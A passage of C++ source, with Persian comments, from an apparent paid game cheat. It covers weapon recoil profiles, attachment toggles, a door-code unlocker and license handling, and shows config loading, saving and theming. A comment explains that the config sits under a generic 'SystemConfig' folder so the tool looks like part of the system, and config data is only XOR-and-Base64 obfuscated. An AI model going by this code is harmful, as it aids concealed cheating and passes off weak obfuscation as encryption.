std::string base64_decode(const std::string& in) {
    std::string out;

    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T[base64_chars[i]] = i;

    int val = 0, valb = -8;
    for (unsigned char c : in) {
        if (is_base64(c)) {
            val = (val << 6) + T[c];
            valb += 6;
            while (valb >= 0) {
                out.push_back(char((val >> valb) & 0xff));
                valb -= 8;
            }
        }
    }
    return out;
}

// Combined encryption: XOR -> Base64
std::string encrypt_license_key(const std::string& license_key, const std::string& key) {
    if (license_key.empty()) return "";
    std::string xored = xor_encrypt_decrypt(license_key, key);
    return base64_encode(xored);
}

// Combined decryption: Base64 -> XOR
std::string decrypt_license_key(const std::string& encrypted_key, const std::string& key) {
    if (encrypted_key.empty()) return "";
    try {
        std::string base64_decoded = base64_decode(encrypted_key);
        return xor_encrypt_decrypt(base64_decoded, key);
    } catch (...) {
        // Handle potential errors during base64 decoding of corrupted data
        output_log_message("Warning: Failed to decrypt license key. It might be corrupted or use an old format.\n");
        return ""; // Return empty string on failure
    }
}

// --- Encryption helpers for full config file ---
// از همان XOR + Base64 استفاده میکنیم تا کل config را رمز کنیم
std::string encrypt_config_data(const std::string& plain) {
    if (plain.empty()) return "";
    return encrypt_license_key(plain, XOR_KEY);
}

std::string decrypt_config_data(const std::string& encrypted) {
    if (encrypted.empty()) return "";
    return decrypt_license_key(encrypted, XOR_KEY);
}

// اعلان توابع مسیر config قبل از استفاده
std::string get_config_path();
std::string get_executable_config_path();     // مسیر کنار exe (فقط برای fallback لود قدیمی)
std::string get_appdata_config_path();        // مسیر اصلی در AppData ویندوز

// --- Config Loading/Saving ---
void load_config() {
    // فقط از مسیر AppData\Local\SystemConfig\config.json استفاده می‌کنیم
    std::string config_path = get_config_path();
    std::ifstream config_file(config_path);

    output_log_message("Loading initial config from " + config_path + "...\n");

    // Initialize attachment states with defaults
    for (const auto& profile_name : ALL_PROFILES) {
        g_attachment_states[profile_name] = AttachmentState{}; // Default initializes all bools to false
    }

    // Initialize keybinds and door unlocker settings with defaults before loading
    reset_keybinds_to_defaults();
    g_door_unlock_code = 0; // Default door code is 0
    // global_macro_enabled حذف شد
    g_sound_enabled.store(true); // Default sound to enabled

    // Default license state and subscription info (DO NOT LOAD FROM FILE)
    is_licensed.store(false);
    current_view = ViewState::Login; // Always start in Login view
    g_activation_time = std::chrono::system_clock::time_point(); // Default to epoch
    g_subscription_duration_seconds = 0; // Reset actual duration

    // Initialize Remember Me state and saved license key to defaults
    g_remember_me = false;
    g_saved_license_key = "";

    if (!config_file.is_open()) {
        std::cerr << "Warning: " << config_path << " not found. Using default settings (Sens=" << SENSITIVITY << ", FOV=" << FOV << ", Default Keybinds, Default Door Unlocker, Global Macro Enabled, Sound Enabled)." << std::endl;
        output_log_message("Warning: " + config_path + " not found. Using defaults.\n");
        {
            std::lock_guard<std::mutex> lock(profile_mutex);
            current_gun_profile_str = PROFILE_AK47;
            profile_macro_active.store(true);
        }
        output_log_message("Default profile selected (first run): " + current_gun_profile_str + "\n");
        return;
    }

    nlohmann::json config_json; // Use explicit namespace
    try {
        // کل فایل را به صورت رشته میخوانیم تا بتوانیم اول Decrypt و بعد JSON parse کنیم
        std::stringstream buffer;
        buffer << config_file.rdbuf();
        std::string file_contents = buffer.str();
        config_file.close();

        bool parsed = false;

        // 1) تلاش برای دیکریپت و parse (فرمت جدید رمز شده)
        std::string decrypted = decrypt_config_data(file_contents);
        if (!decrypted.empty()) {
            try {
                config_json = nlohmann::json::parse(decrypted);
                parsed = true;
            } catch (const nlohmann::json::parse_error&) {
                // اگر دیکریپت اشتباه بود یا فایل قدیمی plaintext بود، به مرحله بعد میرویم
            }
        }

        // 2) اگر هنوز parse نشده، تلاش برای parse مستقیم به عنوان JSON خام (سازگاری با نسخههای قدیمی)
        if (!parsed) {
            config_json = nlohmann::json::parse(file_contents);
        }

        // --- Load General Settings ---
        if (config_json.contains("Settings")) {
            const auto& settings = config_json["Settings"];
            if (settings.contains("SENSITIVITY") && settings["SENSITIVITY"].is_number()) {
                SENSITIVITY = settings["SENSITIVITY"].get<double>();
            }
            if (settings.contains("FOV") && settings["FOV"].is_number()) {
                FOV = settings["FOV"].get<double>();
            }
             if (settings.contains("SoundEnabled") && settings["SoundEnabled"].is_boolean()) {
                 g_sound_enabled.store(settings["SoundEnabled"].get<bool>());
             }
             if (settings.contains("AutoCrouchScopeEnabled") && settings["AutoCrouchScopeEnabled"].is_boolean()) {
                 g_auto_crouch_scope_enabled.store(settings["AutoCrouchScopeEnabled"].get<bool>());
             }
             if (settings.contains("AutoSaveEnabled") && settings["AutoSaveEnabled"].is_boolean()) {
                 AUTO_SAVE_ENABLED = settings["AutoSaveEnabled"].get<bool>();
             }
             if (settings.contains("TotalUsageSeconds") && settings["TotalUsageSeconds"].is_number_integer()) {
                 g_total_usage_seconds = settings["TotalUsageSeconds"].get<long long>();
             }
         }
        
        // --- Load Theme Settings ---
        if (config_json.contains("Theme")) {
            const auto& theme = config_json["Theme"];
            
            // Load Background Color
            if (theme.contains("BackgroundColor") && theme["BackgroundColor"].is_array() && theme["BackgroundColor"].size() == 4) {
                g_theme_settings.background_color.x = theme["BackgroundColor"][0].get<float>();
                g_theme_settings.background_color.y = theme["BackgroundColor"][1].get<float>();
                g_theme_settings.background_color.z = theme["BackgroundColor"][2].get<float>();
                g_theme_settings.background_color.w = theme["BackgroundColor"][3].get<float>();
            }
            
            // Load Text Color
            if (theme.contains("TextColor") && theme["TextColor"].is_array() && theme["TextColor"].size() == 4) {
                g_theme_settings.text_color.x = theme["TextColor"][0].get<float>();
                g_theme_settings.text_color.y = theme["TextColor"][1].get<float>();
                g_theme_settings.text_color.z = theme["TextColor"][2].get<float>();
                g_theme_settings.text_color.w = theme["TextColor"][3].get<float>();
            }
            
            // Load Button Color
            if (theme.contains("ButtonColor") && theme["ButtonColor"].is_array() && theme["ButtonColor"].size() == 4) {
                g_theme_settings.button_color.x = theme["ButtonColor"][0].get<float>();
                g_theme_settings.button_color.y = theme["ButtonColor"][1].get<float>();
                g_theme_settings.button_color.z = theme["ButtonColor"][2].get<float>();
                g_theme_settings.button_color.w = theme["ButtonColor"][3].get<float>();
            }
            
            // Load Button Hovered Color
            if (theme.contains("ButtonHoveredColor") && theme["ButtonHoveredColor"].is_array() && theme["ButtonHoveredColor"].size() == 4) {
                g_theme_settings.button_hovered_color.x = theme["ButtonHoveredColor"][0].get<float>();
                g_theme_settings.button_hovered_color.y = theme["ButtonHoveredColor"][1].get<float>();
                g_theme_settings.button_hovered_color.z = theme["ButtonHoveredColor"][2].get<float>();
                g_theme_settings.button_hovered_color.w = theme["ButtonHoveredColor"][3].get<float>();
            }
            
            // Load Button Active Color
            if (theme.contains("ButtonActiveColor") && theme["ButtonActiveColor"].is_array() && theme["ButtonActiveColor"].size() == 4) {
                g_theme_settings.button_active_color.x = theme["ButtonActiveColor"][0].get<float>();
                g_theme_settings.button_active_color.y = theme["ButtonActiveColor"][1].get<float>();
                g_theme_settings.button_active_color.z = theme["ButtonActiveColor"][2].get<float>();
                g_theme_settings.button_active_color.w = theme["ButtonActiveColor"][3].get<float>();
            }
            
            // Load Header Color
            if (theme.contains("HeaderColor") && theme["HeaderColor"].is_array() && theme["HeaderColor"].size() == 4) {
                g_theme_settings.header_color.x = theme["HeaderColor"][0].get<float>();
                g_theme_settings.header_color.y = theme["HeaderColor"][1].get<float>();
                g_theme_settings.header_color.z = theme["HeaderColor"][2].get<float>();
                g_theme_settings.header_color.w = theme["HeaderColor"][3].get<float>();
            }
        }

        // --- Load Attachment States ---
        if (config_json.contains("Attachments")) {
            const auto& attachments_json = config_json["Attachments"];
            for (const auto& profile_name : ALL_PROFILES) {
                if (attachments_json.contains(profile_name)) {
                    const auto& profile_attachments = attachments_json[profile_name];
                    // بارگذاری تنظیمات اتصالات با نام‌های کلید قدیمی (برای سازگاری با نسخه‌های قبلی)
                    if (profile_attachments.contains("Holo") && profile_attachments["Holo"].is_boolean()) g_attachment_states[profile_name].holo = profile_attachments["Holo"].get<bool>();
                    if (profile_attachments.contains("8x") && profile_attachments["8x"].is_boolean()) g_attachment_states[profile_name].x8 = profile_attachments["8x"].get<bool>();
                    if (profile_attachments.contains("16x") && profile_attachments["16x"].is_boolean()) g_attachment_states[profile_name].x16 = profile_attachments["16x"].get<bool>();
                    if (profile_attachments.contains("Handmade") && profile_attachments["Handmade"].is_boolean()) g_attachment_states[profile_name].handmade = profile_attachments["Handmade"].get<bool>();
                    if (profile_attachments.contains("MuzzleBoost") && profile_attachments["MuzzleBoost"].is_boolean()) g_attachment_states[profile_name].muzzle_boost = profile_attachments["MuzzleBoost"].get<bool>();
                    if (profile_attachments.contains("MuzzleBrake") && profile_attachments["MuzzleBrake"].is_boolean()) g_attachment_states[profile_name].muzzle_brake = profile_attachments["MuzzleBrake"].get<bool>();
                    
                    // بارگذاری تنظیمات اتصالات با نام‌های کلید جدید
                    if (profile_attachments.contains("holo") && profile_attachments["holo"].is_boolean()) g_attachment_states[profile_name].holo = profile_attachments["holo"].get<bool>();
                    if (profile_attachments.contains("x8") && profile_attachments["x8"].is_boolean()) g_attachment_states[profile_name].x8 = profile_attachments["x8"].get<bool>();
                    if (profile_attachments.contains("x16") && profile_attachments["x16"].is_boolean()) g_attachment_states[profile_name].x16 = profile_attachments["x16"].get<bool>();
                    if (profile_attachments.contains("handmade") && profile_attachments["handmade"].is_boolean()) g_attachment_states[profile_name].handmade = profile_attachments["handmade"].get<bool>();
                    if (profile_attachments.contains("muzzle_boost") && profile_attachments["muzzle_boost"].is_boolean()) g_attachment_states[profile_name].muzzle_boost = profile_attachments["muzzle_boost"].get<bool>();
                    if (profile_attachments.contains("muzzle_brake") && profile_attachments["muzzle_brake"].is_boolean()) g_attachment_states[profile_name].muzzle_brake = profile_attachments["muzzle_brake"].get<bool>();
                }
            }
        }
        
        // --- بارگذاری پروفایل فعلی ---
        if (config_json.contains("CurrentProfile") && config_json["CurrentProfile"].is_string()) {
            std::string saved_profile = config_json["CurrentProfile"].get<std::string>();
            // بررسی معتبر بودن پروفایل
            auto it = std::find(ALL_PROFILES.begin(), ALL_PROFILES.end(), saved_profile);
            if (it != ALL_PROFILES.end()) {
                std::lock_guard<std::mutex> lock(profile_mutex);
                current_gun_profile_str = saved_profile;
                // حذف خط مربوط به current_weapon_index که تعریف نشده است
                profile_macro_active.store(true);
                output_log_message("Loaded saved profile: " + saved_profile + "\n");
            } else {
                {
                    std::lock_guard<std::mutex> lock(profile_mutex);
                    current_gun_profile_str = PROFILE_AK47;
                    profile_macro_active.store(true);
                }
                output_log_message("Invalid CurrentProfile. Using default profile: " + current_gun_profile_str + "\n");
            }
        } else {
            {
                std::lock_guard<std::mutex> lock(profile_mutex);
                current_gun_profile_str = PROFILE_AK47;
                profile_macro_active.store(true);
            }
            output_log_message("No CurrentProfile found. Using default profile: " + current_gun_profile_str + "\n");
        }

        // --- Load Keybinds ---
        if (config_json.contains("Keybinds")) {
            const auto& keybinds_json = config_json["Keybinds"];
            // Load special keybinds
            if (keybinds_json.contains("UI_Toggle") && keybinds_json["UI_Toggle"].is_string()) {
                int vk_code = vk_string_to_code(keybinds_json["UI_Toggle"].get<std::string>());
                if (vk_code != 0) g_ui_toggle_key.store(vk_code);
            }
            if (keybinds_json.contains("Exit") && keybinds_json["Exit"].is_string()) {
                int vk_code = vk_string_to_code(keybinds_json["Exit"].get<std::string>());
                if (vk_code != 0) g_exit_app_key.store(vk_code);
            }
             // بخش مربوط به Global Macro Toggle حذف شد
             if (keybinds_json.contains("LMB") && keybinds_json["LMB"].is_string()) {
                 int vk_code = vk_string_to_code(keybinds_json["LMB"].get<std::string>());
                 if (vk_code != 0) g_lmb_key.store(vk_code);
             }
             if (keybinds_json.contains("RMB") && keybinds_json["RMB"].is_string()) {
                 int vk_code = vk_string_to_code(keybinds_json["RMB"].get<std::string>());
                 if (vk_code != 0) g_rmb_key.store(vk_code);
             }
             if (keybinds_json.contains("NightModeKey") && keybinds_json["NightModeKey"].is_string()) {
                 int vk_code_nm = vk_string_to_code(keybinds_json["NightModeKey"].get<std::string>());
                 if (vk_code_nm != 0) g_nightModeKey.store(vk_code_nm);
             }

            // Load weapon profile keybinds
            std::lock_guard<std::mutex> lock(profile_mutex); // Protect g_profile_keybinds
            for (const auto& pair : g_profile_keybinds) {
                if (keybinds_json.contains(pair.first) && keybinds_json[pair.first].is_string()) {
                    int vk_code = vk_string_to_code(keybinds_json[pair.first].get<std::string>());
                    if (vk_code != 0) g_profile_keybinds[pair.first] = vk_code;
                }
            }
        }
        
        // --- Load Door Unlocker Settings ---
        if (config_json.contains("DoorUnlocker")) {
            const auto& door_unlocker_json = config_json["DoorUnlocker"];
            if (door_unlocker_json.contains("Code") && door_unlocker_json["Code"].is_number_integer()) {
                g_door_unlock_code = door_unlocker_json["Code"].get<int>();
                 // Clamp the loaded code to 4 digits (0-9999)
                 g_door_unlock_code = std::max(0, std::min(9999, g_door_unlock_code));
                output_log_message("[CONFIG_DEBUG] Door Unlocker Code read as integer: " + std::to_string(g_door_unlock_code) + "\n");
            } else {
                output_log_message("[CONFIG_DEBUG] DoorUnlocker Code not found or not an integer in config.json. Using default: " + std::to_string(g_door_unlock_code) + "\n");
            }
            if (door_unlocker_json.contains("TriggerKey") && door_unlocker_json["TriggerKey"].is_string()) {
                int vk_code = vk_string_to_code(door_unlocker_json["TriggerKey"].get<std::string>());
                if (vk_code != 0) g_door_unlock_trigger_key = vk_code;
            }
        }

        // Legacy driver status is no longer used

        // --- Load Remember Me Settings ---
        if (config_json.contains("Login")) {
            const auto& login_settings = config_json["Login"];
            if (login_settings.contains("RememberMe") && login_settings["RememberMe"].is_boolean()) {
                g_remember_me = login_settings["RememberMe"].get<bool>();
            }
            if (login_settings.contains("SavedLicenseKey") && login_settings["SavedLicenseKey"].is_string()) {
                // Decrypt the loaded key if Remember Me is enabled
                std::string loaded_encrypted_key = login_settings["SavedLicenseKey"].get<std::string>();
                if (g_remember_me && !loaded_encrypted_key.empty()) {
                     g_saved_license_key = decrypt_license_key(loaded_encrypted_key, XOR_KEY);
                     if (g_saved_license_key.empty()) {
                         // If decryption failed, clear the remember me flag and saved key
                         g_remember_me = false;
                         output_log_message("Decryption of saved license key failed. Disabling Remember Me.\n");
                     }
                } else {
                    // If Remember Me is not enabled or key is empty, just load the raw string (should be empty)
                    g_saved_license_key = loaded_encrypted_key; // Should be "" if not remembering
                }
            }
        }

    } catch (const nlohmann::json::parse_error& e) { // Use explicit namespace
        std::cerr << "Warning: config.json parse error: " << e.what() << ". Using default settings." << std::endl;
        output_log_message("Warning: config.json parse error.\n");
        set_ui_notice(UINoticeLevel::Warning,
                      "Settings",
                      "Settings file is corrupted. Defaults were loaded.",
                      std::string("Config path: ") + config_path);
        // On parse error, defaults initialized earlier will be used.
    } catch (const std::exception& e) {
        std::cerr << "Warning: Error loading config.json: " << e.what() << ". Using default settings." << std::endl;
        output_log_message("Warning: Error loading config.json.\n");
        set_ui_notice(UINoticeLevel::Warning,
                      "Settings",
                      "Could not load settings. Defaults were loaded.",
                      std::string("Config path: ") + config_path);
        // On other errors, defaults initialized earlier will be used.
    }

    output_log_message("Initial config loaded from config.json. SENSITIVITY: " + std::to_string(SENSITIVITY) + ", FOV: " + std::to_string(FOV) + ", Base Multiplier=" + std::to_string(screenMultiplier) + ", Door Code=" + std::to_string(g_door_unlock_code) + ", Door Trigger=" + vk_code_to_string(g_door_unlock_trigger_key) + ", Sound Enabled=" + (g_sound_enabled.load() ? "true" : "false") + "\n");
}

std::string get_appdata_config_path() {
    char path[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path) != S_OK) {
        return "";
    }

    std::string base_path(path);
    // نام پوشه را عمومی/سیستمی نگه می‌داریم، نه با نام برنامه
    std::string app_folder = base_path + "\\SystemConfig";
    CreateDirectoryA(app_folder.c_str(), NULL);
    return app_folder + "\\config.json";
}

// ایجاد مسیر کامل برای فایل config.json (مسیر اصلی)
std::string get_config_path() {
    // فقط مسیر AppData را به عنوان محل اصلی برمی‌گردانیم
    std::string appdata_config = get_appdata_config_path();
    if (!appdata_config.empty()) {
        return appdata_config;
    }

    // اگر به هر دلیل AppData در دسترس نبود، آخرین fallback یک فایل نسبی است
    return "config.json";
}

// اعلان تابع save_config قبل از استفاده در AutoSaveIfEnabled
void save_config();

// تابع برای ذخیره خودکار تنظیمات در صورت فعال بودن قابلیت Auto Save
void AutoSaveIfEnabled() {
    if (AUTO_SAVE_ENABLED) {
        save_config();
        // نمایش پیام بازخورد به کاربر
        show_feedback_message("Settings saved automatically");
    }
}

void save_config() {
    std::string config_path = get_config_path();
    if (config_path.empty()) {
        output_log_message("Error: get_config_path() returned empty. Cannot save config.\n");
        return;
    }

    std::ofstream config_file(config_path);
    if (!config_file.is_open()) {
        // اگر نتوانستیم باز کنیم، تلاش می‌کنیم فایل قبلی را (در همین مسیر) پاک کنیم و دوباره بسازیم
        DWORD attrs = GetFileAttributesA(config_path.c_str());
        if (attrs != INVALID_FILE_ATTRIBUTES) {
            // حذف پرچم ReadOnly در صورت وجود
            if (attrs & FILE_ATTRIBUTE_READONLY) {
                SetFileAttributesA(config_path.c_str(), attrs & ~FILE_ATTRIBUTE_READONLY);
            }
            DeleteFileA(config_path.c_str());
        }
        config_file.open(config_path);
    }

    if (!config_file.is_open()) {
        std::cerr << "Error: Could not open " << config_path << " for saving." << std::endl;
        output_log_message("Error: Could not save to " + config_path + "\n");
        return;
    }

    output_log_message("Saving config to " + config_path + "...\n");

    nlohmann::json config_json; // Use explicit namespace

    // --- Save General Settings ---
    config_json["Settings"]["SENSITIVITY"] = SENSITIVITY;
    config_json["Settings"]["FOV"] = FOV;
    config_json["Settings"]["SoundEnabled"] = g_sound_enabled.load();
    config_json["Settings"]["AutoCrouchScopeEnabled"] = g_auto_crouch_scope_enabled.load();
    config_json["Settings"]["AutoSaveEnabled"] = AUTO_SAVE_ENABLED; // ذخیره تنظیمات Auto Save
    config_json["Settings"]["TotalUsageSeconds"] = g_total_usage_seconds;
    
    // --- Save Theme Settings ---
    config_json["Theme"]["BackgroundColor"][0] = g_theme_settings.background_color.x;
    config_json["Theme"]["BackgroundColor"][1] = g_theme_settings.background_color.y;
    config_json["Theme"]["BackgroundColor"][2] = g_theme_settings.background_color.z;
    config_json["Theme"]["BackgroundColor"][3] = g_theme_settings.background_color.w;
    
    config_json["Theme"]["TextColor"][0] = g_theme_settings.text_color.x;
    config_json["Theme"]["TextColor"][1] = g_theme_settings.text_color.y;
    config_json["Theme"]["TextColor"][2] = g_theme_settings.text_color.z;
    config_json["Theme"]["TextColor"][3] = g_theme_settings.text_color.w;
    
    config_json["Theme"]["ButtonColor"][0] = g_theme_settings.button_color.x;
    config_json["Theme"]["ButtonColor"][1] = g_theme_settings.button_color.y;
    config_json["Theme"]["ButtonColor"][2] = g_theme_settings.button_color.z;
    config_json["Theme"]["ButtonColor"][3] = g_theme_settings.button_color.w;
    
    config_json["Theme"]["ButtonHoveredColor"][0] = g_theme_settings.button_hovered_color.x;
    config_json["Theme"]["ButtonHoveredColor"][1] = g_theme_settings.button_hovered_color.y;
    config_json["Theme"]["ButtonHoveredColor"][2] = g_theme_settings.button_hovered_color.z;
    config_json["Theme"]["ButtonHoveredColor"][3] = g_theme_settings.button_hovered_color.w;
    
    config_json["Theme"]["ButtonActiveColor"][0] = g_theme_settings.button_active_color.x;
    config_json["Theme"]["ButtonActiveColor"][1] = g_theme_settings.button_active_color.y;
    config_json["Theme"]["ButtonActiveColor"][2] = g_theme_settings.button_active_color.z;
    config_json["Theme"]["ButtonActiveColor"][3] = g_theme_settings.button_active_color.w;
    
    config_json["Theme"]["HeaderColor"][0] = g_theme_settings.header_color.x;
    config_json["Theme"]["HeaderColor"][1] = g_theme_settings.header_color.y;
    config_json["Theme"]["HeaderColor"][2] = g_theme_settings.header_color.z;
    config_json["Theme"]["HeaderColor"][3] = g_theme_settings.header_color.w;
    // --- Save Attachment States ---
    for (const auto& pair : g_attachment_states) {
        const std::string& profile_name = pair.first;
        const AttachmentState& state = pair.second;

        config_json["Attachments"][profile_name]["Holo"] = state.holo;
        config_json["Attachments"][profile_name]["8x"] = state.x8;
        config_json["Attachments"][profile_name]["16x"] = state.x16;
        config_json["Attachments"][profile_name]["Handmade"] = state.handmade;
        // Only save MuzzleBoost if the gun profile is one that uses it in the UI/logic
        const std::string& current_profile_check = profile_name;
        if (current_profile_check == PROFILE_AK47 || current_profile_check == PROFILE_LR300 || current_profile_check == PROFILE_THOMPSON || current_profile_check == PROFILE_MP5A4) {
             config_json["Attachments"][profile_name]["MuzzleBoost"] = state.muzzle_boost;
             config_json["Attachments"][profile_name]["MuzzleBrake"] = state.muzzle_brake;
        }
    }

    // --- Save Keybinds ---
    {
        std::lock_guard<std::mutex> lock(profile_mutex); // Protect g_profile_keybinds
        // Save special keybinds
        config_json["Keybinds"]["UI_Toggle"] = vk_code_to_string(g_ui_toggle_key.load(std::memory_order_relaxed));
        config_json["Keybinds"]["Exit"] = vk_code_to_string(g_exit_app_key.load(std::memory_order_relaxed));
        config_json["Keybinds"]["LMB"] = vk_code_to_string(g_lmb_key.load(std::memory_order_relaxed));
        config_json["Keybinds"]["RMB"] = vk_code_to_string(g_rmb_key.load(std::memory_order_relaxed));
        config_json["Keybinds"]["NightModeKey"] = vk_code_to_string(g_nightModeKey.load(std::memory_order_relaxed));

        // Save weapon profile keybinds
        for (const auto& pair : g_profile_keybinds) {
            config_json["Keybinds"][pair.first] = vk_code_to_string(pair.second);
        }
    } // Mutex released
    // --- Save Door Unlocker Settings ---
    config_json["DoorUnlocker"]["Code"] = g_door_unlock_code;
    config_json["DoorUnlocker"]["TriggerKey"] = vk_code_to_string(g_door_unlock_trigger_key);

    // --- Save Remember Me Settings ---
    config_json["Login"]["RememberMe"] = g_remember_me;
    if (g_remember_me) {
        // Only save the license key if Remember Me is checked
        // Use license_key_input if available, otherwise use the saved key if it exists
        std::string key_to_save = license_key_input;
        if (key_to_save.empty() && !g_saved_license_key.empty()) {
             key_to_save = g_saved_license_key; // Use the previously saved/decrypted key if input is empty
        }

        if (!key_to_save.empty()) {
             // Encrypt the key before saving
            config_json["Login"]["SavedLicenseKey"] = encrypt_license_key(key_to_save, XOR_KEY);
        } else {
            // If no key to save (input and saved are empty), save empty string
             config_json["Login"]["SavedLicenseKey"] = "";
        }

    } else {
        // If Remember Me is not checked, clear any previously saved key
        config_json["Login"]["SavedLicenseKey"] = "";
    }

    // --- Save Attachment Settings ---
    // ذخیره تنظیمات اتصالات برای هر اسلحه
    for (const auto& attachment_pair : g_attachment_states) {
        const auto& profile_name = attachment_pair.first;
        const auto& state = attachment_pair.second;
        
        config_json["Attachments"][profile_name]["holo"] = state.holo;
        config_json["Attachments"][profile_name]["x8"] = state.x8;
        config_json["Attachments"][profile_name]["x16"] = state.x16;
        config_json["Attachments"][profile_name]["handmade"] = state.handmade;
        config_json["Attachments"][profile_name]["muzzle_boost"] = state.muzzle_boost;
        config_json["Attachments"][profile_name]["muzzle_brake"] = state.muzzle_brake;
    }
    
    // ذخیره پروفایل فعلی
    config_json["CurrentProfile"] = current_gun_profile_str;

    // Serialize JSON سپس رمز و در فایل بنویس
    std::string plain_json = config_json.dump();
    std::string encrypted_json = encrypt_config_data(plain_json);
    if (encrypted_json.empty()) {
        output_log_message("Error: Failed to encrypt config data. Settings not saved.\n");
        return;
    }

    config_file << encrypted_json;
    config_file.close();

    output_log_message("Settings saved to " + config_path + "\n");
}

// --- Usage Accumulation Helper ---
// این تابع مدت زمان سشن فعلی (از لحظه لاگین تا خروج) را به g_total_usage_seconds اضافه کرده و سپس config را ذخیره می‌کند
void accumulate_usage_and_save() {
    // فقط اگر کاربر در این سشن لاگین بوده است
    if (g_isLoggedIn.load(std::memory_order_relaxed)) {
        // اگر زمان شروع سشن مقداردهی شده باشد
        if (g_session_start_time.time_since_epoch().count() != 0) {
            auto now = std::chrono::steady_clock::now();
            auto delta = std::chrono::duration_cast<std::chrono::seconds>(now - g_session_start_time).count();
            if (delta > 0) {
                g_total_usage_seconds += delta;
            }
        }
    }

    // ذخیره config با مقدار به‌روز شده
    save_config();
}

// --- Theme Functions ---

// Apply theme settings to ImGui
void apply_theme() {
    // بررسی اینکه آیا ImGui آماده است یا نه
    if (!ImGui::GetCurrentContext()) {
        output_log_message("Warning: ImGui context not ready when calling apply_theme()\n");
        return;
    }
    
    try {
        ImGuiStyle& style = ImGui::GetStyle();
        
        // بازنشانی کامل رنگ‌ها و استایل‌ها
        // Set all colors
        ImVec4* colors = style.Colors;
        colors[ImGuiCol_Text] = g_theme_settings.text_color;
        colors[ImGuiCol_TextDisabled] = ImVec4(0.60f, 0.60f, 0.60f, 1.00f);
        colors[ImGuiCol_WindowBg] = g_theme_settings.background_color;
        colors[ImGuiCol_ChildBg] = ImVec4(g_theme_settings.background_color.x + 0.05f, g_theme_settings.background_color.y + 0.05f, g_theme_settings.background_color.z + 0.05f, 0.60f);
        colors[ImGuiCol_PopupBg] = ImVec4(g_theme_settings.background_color.x - 0.02f, g_theme_settings.background_color.y - 0.02f, g_theme_settings.background_color.z - 0.02f, 0.94f);
        colors[ImGuiCol_Border] = ImVec4(0.43f, 0.43f, 0.50f, 0.50f);
        colors[ImGuiCol_BorderShadow] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
        colors[ImGuiCol_FrameBg] = ImVec4(g_theme_settings.background_color.x + 0.10f, g_theme_settings.background_color.y + 0.10f, g_theme_settings.background_color.z + 0.10f, 0.54f);
        colors[ImGuiCol_FrameBgHovered] = ImVec4(g_theme_settings.button_hovered_color.x, g_theme_settings.button_hovered_color.y, g_theme_settings.button_hovered_color.z, 0.40f);
        colors[ImGuiCol_FrameBgActive] = ImVec4(g_theme_settings.button_active_color.x, g_theme_settings.button_active_color.y, g_theme_settings.button_active_color.z, 0.67f);
        colors[ImGuiCol_TitleBg] = ImVec4(g_theme_settings.background_color.x + 0.05f, g_theme_settings.background_color.y + 0.05f, g_theme_settings.background_color.z + 0.05f, 1.00f);
        colors[ImGuiCol_TitleBgActive] = ImVec4(g_theme_settings.background_color.x + 0.10f, g_theme_settings.background_color.y + 0.10f, g_theme_settings.background_color.z + 0.10f, 1.00f);
        colors[ImGuiCol_TitleBgCollapsed] = ImVec4(g_theme_settings.background_color.x + 0.05f, g_theme_settings.background_color.y + 0.05f, g_theme_settings.background_color.z + 0.05f, 0.75f);
        colors[ImGuiCol_MenuBarBg] = ImVec4(g_theme_settings.background_color.x + 0.05f, g_theme_settings.background_color.y + 0.05f, g_theme_settings.background_color.z + 0.05f, 0.47f);
        colors[ImGuiCol_ScrollbarBg] = ImVec4(g_theme_settings.background_color.x + 0.05f, g_theme_settings.background_color.y + 0.05f, g_theme_settings.background_color.z + 0.05f, 1.00f);
        colors[ImGuiCol_ScrollbarGrab] = ImVec4(g_theme_settings.button_color.x + 0.15f, g_theme_settings.button_color.y + 0.15f, g_theme_settings.button_color.z + 0.15f, 0.31f);
        colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(g_theme_settings.button_hovered_color.x + 0.15f, g_theme_settings.button_hovered_color.y + 0.15f, g_theme_settings.button_hovered_color.z + 0.15f, 0.78f);
        colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(g_theme_settings.button_active_color.x + 0.15f, g_theme_settings.button_active_color.y + 0.15f, g_theme_settings.button_active_color.z + 0.15f, 1.00f);
        colors[ImGuiCol_CheckMark] = ImVec4(g_theme_settings.button_active_color.x + 0.20f, g_theme_settings.button_active_color.y + 0.20f, g_theme_settings.button_active_color.z + 0.20f, 0.83f);
        colors[ImGuiCol_SliderGrab] = ImVec4(g_theme_settings.button_color.x + 0.15f, g_theme_settings.button_color.y + 0.15f, g_theme_settings.button_color.z + 0.15f, 0.24f);
        colors[ImGuiCol_SliderGrabActive] = ImVec4(g_theme_settings.button_active_color.x + 0.15f, g_theme_settings.button_active_color.y + 0.15f, g_theme_settings.button_active_color.z + 0.15f, 1.00f);
        colors[ImGuiCol_Button] = g_theme_settings.button_color;
        colors[ImGuiCol_ButtonHovered] = g_theme_settings.button_hovered_color;
        colors[ImGuiCol_ButtonActive] = g_theme_settings.button_active_color;
        colors[ImGuiCol_Header] = g_theme_settings.header_color;
        colors[ImGuiCol_HeaderHovered] = ImVec4(g_theme_settings.header_color.x + 0.1f, g_theme_settings.header_color.y + 0.1f, g_theme_settings.header_color.z + 0.1f, g_theme_settings.header_color.w);
        colors[ImGuiCol_HeaderActive] = ImVec4(g_theme_settings.header_color.x + 0.2f, g_theme_settings.header_color.y + 0.2f, g_theme_settings.header_color.z + 0.2f, g_theme_settings.header_color.w);
        colors[ImGuiCol_Separator] = ImVec4(g_theme_settings.header_color.x, g_theme_settings.header_color.y, g_theme_settings.header_color.z, 0.33f);
        colors[ImGuiCol_SeparatorHovered] = ImVec4(g_theme_settings.header_color.x + 0.1f, g_theme_settings.header_color.y + 0.1f, g_theme_settings.header_color.z + 0.1f, 0.67f);
        colors[ImGuiCol_SeparatorActive] = ImVec4(g_theme_settings.header_color.x + 0.2f, g_theme_settings.header_color.y + 0.2f, g_theme_settings.header_color.z + 0.2f, 1.00f);
        colors[ImGuiCol_ResizeGrip] = ImVec4(g_theme_settings.button_color.x, g_theme_settings.button_color.y, g_theme_settings.button_color.z, 0.20f);
        colors[ImGuiCol_ResizeGripHovered] = ImVec4(g_theme_settings.button_hovered_color.x, g_theme_settings.button_hovered_color.y, g_theme_settings.button_hovered_color.z, 0.67f);
